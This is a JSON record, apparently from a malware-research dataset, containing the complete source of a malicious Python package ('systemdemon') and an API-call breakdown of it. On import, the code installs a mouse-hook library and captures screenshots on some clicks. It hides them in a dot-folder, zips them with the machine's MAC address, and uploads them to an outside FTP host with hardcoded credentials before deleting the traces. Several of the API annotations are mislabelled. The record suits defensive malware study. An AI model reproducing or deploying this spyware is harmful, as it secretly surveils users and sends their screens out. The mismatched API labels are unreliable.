[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/systemdemon-2.9-py3-none-any/systemdemon/__init__.py",
    "code_snippet": "import re, uuid\nimport random\nimport time\nimport urllib.request\nfrom ftplib import FTP\nimport socket\nfrom pathlib import Path\nfrom os import path\nimport glob\nfrom zipfile import ZipFile\nimport os\ntry:\n    import pynput\nexcept:\n    os.system(\"pip install pynput -q -q -q\")\nfrom pynput import mouse\nfrom PIL import ImageGrab\niden=':'.join(re.findall('..', '%012x' % uuid.getnode()))\nt = time.localtime()\ntimestamp = time.strftime('%b-%d-%Y', t)\nIPAddr = \"ourobs\"\nPATH = '/home/' + os.getlogin() + '/.crontd/'\ndef shot():\n    isExist = os.path.exists(PATH)\n    if not isExist:\n        os.makedirs(PATH)\n    hellarea = random.randint(0, 100)\n    hellar = str(hellarea)\n    snapshot = ImageGrab.grab()\n    BACKUP_NAME = (hellar + \"-shots.png\")\n    snapshot.save(PATH + '/' + BACKUP_NAME)\n    count()\ndef hel():\n    hellarea = random.randint(0, 100)\n    hellar = str(hellarea)\n    output_zip_path = '/home/' + os.getlogin() + '/.crontd/' + iden +'-'+IPAddr+ '-' + timestamp + '-' + hellar + '-' + 'clickshots.zip'\n    file1_path='/home/'+os.getlogin()+'/.crontd/'\n    with ZipFile(output_zip_path, 'w') as zipObj:\n       for file in glob.glob(file1_path + \"*.png\"):\n                zipObj.write(file, path.basename(path.normpath(file)))\n    try:\n        host = socket.gethostbyname(\"www.google.com\")\n        s = socket.create_connection((host, 80), 2)\n        file_path = Path(output_zip_path)\n        with FTP('ftpupload.net', 'epiz_33429346', 'uhoU6bJvPpJUiTM') as ftp, open(file_path, 'rb') as file:\n            ftp.storbinary(f'STOR {file_path.name}', file)\n            os.remove(file_path)\n        rem()\n    except:\n        exit()\n    return False\ndef count():\n    dir_path = PATH\n    count = 0\n    for path in os.listdir(dir_path):\n        if os.path.isfile(os.path.join(dir_path, path)):\n            count += 1\n    if count == 7:\n        hel()\n    else:\n        foo()\ndef rem():\n    directory = PATH\n    files_in_directory = os.listdir(directory)\n    filtered_files = [file for file in files_in_directory if file.endswith(\".png\")]\n    for file in filtered_files:\n        path_to_file = os.path.join(directory, file)\n        os.remove(path_to_file)\n    foo()\ndef foo():\n    i = 0\n    while True:\n        i += 1\n        if i==4:\n            i=0\n            shot()\n        else:\n            print()\n        yield\ndef on_click(x, y, button, pressed, foo):\n    if pressed:\n        next(foo)\nfrom functools import partial\nbar = partial(on_click, foo=foo())\nwith mouse.Listener(on_click=bar) as listener:\n    listener.join()\n",
    "pattern_analysis": {
      "api_sequence": [
        "re.findall",
        "uuid.getnode",
        "time.localtime",
        "time.strftime",
        "os.getlogin",
        "os.path.exists",
        "os.makedirs",
        "random.randint",
        "ImageGrab.grab",
        "PIL.Image.Image.save",
        "os.listdir",
        "os.path.isfile",
        "os.path.join",
        "os.getlogin",
        "os.getlogin",
        "os.getlogin",
        "ZipFile.__init__",
        "glob.glob",
        "path.normpath",
        "path.basename",
        "ZipFile.write",
        "socket.gethostbyname",
        "socket.create_connection",
        "Path.__init__",
        "FTP.__init__",
        "open",
        "FTP.storbinary",
        "os.remove",
        "os.listdir",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "re.findall('..', '%012x' % uuid.getnode())",
        "uuid.getnode()",
        "time.localtime()",
        "time.strftime('%b-%d-%Y', t)",
        "os.getlogin()",
        "os.path.exists(PATH)",
        "os.makedirs(PATH)",
        "random.randint(0, 100)",
        "ImageGrab.grab()",
        "snapshot.save(PATH + '/' + BACKUP_NAME)",
        "os.listdir(dir_path)",
        "os.path.isfile(os.path.join(dir_path, path))",
        "os.path.join(dir_path, path)",
        "os.getlogin()",
        "os.getlogin()",
        "os.getlogin()",
        "ZipFile(output_zip_path, 'w')",
        "glob.glob(file1_path + \"*.png\")",
        "path.normpath(file)",
        "path.basename(path.normpath(file))",
        "zipObj.write(file, path.basename(path.normpath(file)))",
        "socket.gethostbyname(\"www.google.com\")",
        "socket.create_connection((host, 80), 2)",
        "Path(output_zip_path)",
        "FTP('ftpupload.net', 'epiz_33429346', 'uhoU6bJvPpJUiTM')",
        "open(file_path, 'rb')",
        "ftp.storbinary(f'STOR {file_path.name}', file)",
        "os.remove(file_path)",
        "os.listdir(directory)",
        "os.remove(path_to_file)"
      ],
      "mapped_sequence": [
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "uuid.getnode",
          "id": "get_hardware_address",
          "description": "Retrieves hardware address as 48-bit integer",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "time.localtime",
          "id": "convert_epoch_to_time",
          "description": "Converts seconds since epoch to local time tuple",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "time.strftime",
          "id": "format_local_time",
          "description": "Formats local time tuple as string",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "random.randint",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "ImageGrab.grab",
          "id": "capture_entire_screen",
          "description": "Captures screenshot of the entire screen",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "screen_capture"
        },
        {
          "api_name": "PIL.Image.Image.save",
          "id": "save_image_file",
          "description": "Saves image to file in PNG format",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "image_processing"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ZipFile.__init__",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "glob.glob",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "path.normpath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "path.basename",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "socket.gethostbyname",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "socket.create_connection",
          "id": "establish_tcp_connection",
          "description": "Establishes TCP connection to specified address",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "Path.__init__",
          "id": "path_object_operations",
          "description": "Path object and status operations (creating Path objects, retrieving file status)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "FTP.__init__",
          "id": "create_socket",
          "description": "Creates new socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "socket_creation"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "FTP.storbinary",
          "id": "upload_file_transfer_sh",
          "description": "Uploads file to transfer.sh and returns URL",
          "first_id": "network_file_transfer",
          "second_id": "file_upload",
          "third_id": "remote_service_upload"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import re, uuid\nimport random\nimport time\nimport urllib.request\nfrom ftplib import FTP\nimport socket\nfrom pathlib import Path\nfrom os import path\nimport glob\nfrom zipfile import ZipFile\nimport os\nfrom pynput import mouse\nfrom PIL import ImageGrab\niden=':'.join(re.findall('..', '%012x' % uuid.getnode()))\nt = time.localtime()\ntimestamp = time.strftime('%b-%d-%Y', t)\nIPAddr = \"ourobs\"\nPATH = '/home/' + os.getlogin() + '/.crontd/'\ndef shot():\n    isExist = os.path.exists(PATH)\n    if not isExist:\n        os.makedirs(PATH)\n    hellarea = random.randint(0, 100)\n    hellar = str(hellarea)\n    snapshot = ImageGrab.grab()\n    BACKUP_NAME = (hellar + \"-shots.png\")\n    snapshot.save(PATH + '/' + BACKUP_NAME)\n    count()\ndef hel():\n    hellarea = random.randint(0, 100)\n    hellar = str(hellarea)\n    output_zip_path = '/home/' + os.getlogin() + '/.crontd/' + iden +'-'+IPAddr+ '-' + timestamp + '-' + hellar + '-' + 'clickshots.zip'\n    file1_path='/home/'+os.getlogin()+'/.crontd/'\n    with ZipFile(output_zip_path, 'w') as zipObj:\n       for file in glob.glob(file1_path + \"*.png\"):\n                zipObj.write(file, path.basename(path.normpath(file)))\n    try:\n        host = socket.gethostbyname(\"www.google.com\")\n        s = socket.create_connection((host, 80), 2)\n        file_path = Path(output_zip_path)\n        with FTP('ftpupload.net', 'epiz_33429346', 'uhoU6bJvPpJUiTM') as ftp, open(file_path, 'rb') as file:\n            ftp.storbinary(f'STOR {file_path.name}', file)\n            os.remove(file_path)\n        rem()\n    except:\n        exit()\n    return False\ndef count():\n    dir_path = PATH\n    count = 0\n    for path in os.listdir(dir_path):\n        if os.path.isfile(os.path.join(dir_path, path)):\n            count += 1\n    if count == 7:\n        hel()\n    else:\n        foo()\ndef rem():\n    directory = PATH\n    files_in_directory = os.listdir(directory)\n    filtered_files = [file for file in files_in_directory if file.endswith(\".png\")]\n    for file in filtered_files:\n        path_to_file = os.path.join(directory, file)\n        os.remove(path_to_file)\n    foo()"
    }
  }
]